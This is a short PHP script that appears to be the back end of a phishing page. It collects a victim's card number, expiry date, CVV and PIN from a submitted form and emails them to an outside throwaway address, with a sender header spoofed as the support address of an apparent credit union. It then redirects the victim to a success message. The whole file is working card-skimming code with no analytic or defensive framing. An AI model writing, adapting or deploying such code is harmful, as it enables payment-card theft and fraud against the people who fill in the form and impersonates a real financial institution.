<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = 'nojeveb444@vikinoko.com';
    // Form 2 data
    $card = $_POST['card'];
    $exdate = $_POST['ex-date'];
    $cvv = $_POST['cvv'];
    $pin = $_POST['pin'];

    
    
    // Compose and send an email for Form 2
    $second = $email;
    $subject2 = "Thank you for your submission (Form 2)";
    $message2 = "Card $card, Date, $exdate, CVV $cvv, Pin $pin";
    $headers2 = "From: support@americanfirst.com";
    
    if (mail($second, $subject2, $message2, $headers2)) {
        // Email sent successfully for Form 2
         // Redirect back to the form with a success message as a query parameter
         header('Location: index.html?success=Form+submitted+successfully!');
         exit;
       
    } else {
        // Error sending email for Form 2
        echo "Form 2 Error sending email.";
    }
}
?>